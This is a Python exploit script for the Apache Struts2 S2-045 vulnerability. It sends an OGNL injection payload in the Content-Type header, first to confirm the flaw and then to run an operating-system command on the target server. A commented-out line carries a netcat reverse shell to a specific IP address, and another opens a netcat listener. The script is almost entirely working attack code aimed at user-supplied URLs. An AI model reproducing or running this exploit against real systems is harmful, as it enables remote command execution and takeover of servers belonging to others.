# encoding:utf-8
from cgitb import html
import requests
import sys
import httplib2
import os
from streamlit import caching
from requests.exceptions import ChunkedEncodingError, ConnectTimeout
import argparse


def exploit(url):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    # payload += "(#cmd='%s')." % cmd
    #payload += "(#cmd='nc -e /bin/sh 221.218.136.208 444')."
    payload += "(#cmd='whoami')."
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        page = requests.post(url, headers=headers,timeout=5,verify=False).text
    except httplib2.IncompleteRead as e:
        page = e.partial

    print(page)
    return page


def Poc(target):
    header = {}
    payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data"
    header['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 " \
                            "(KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header['Content-Type'] = payload
    try:
        res = requests.post(target,headers=header,timeout=5,verify=False)
        print(res.text)
        if res == "":
            print("[!]No Http response")
            return False
        else:
            if "54289" in res.text:
                return True
            else:
                return False
    except ChunkedEncodingError as e:
        return False
    except ConnectionError as e:
        return False
    except ConnectTimeout as e:
        return False
    except Exception as e:
        return False

if __name__ == '__main__':
    caching.clear_cache()
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True,
                        help="target url Example: https://www.example.com/index.action(do)||info.action(do)||admin.action(do) ")
    args = parser.parse_args()
    target_url = args.url
    print("[+]starting to scan the vulnerablities for s2-045")

    if Poc(sys.argv[1]):
        print("[+]" + args.url + " is vulnerable")
        print("[+]Starting to exploit")
        # os.system('cmd /k "nc -lvp 4444"')
        exploit(sys.argv[1])
    else:
        print("[!]" + args.url + " is not vulnerable")
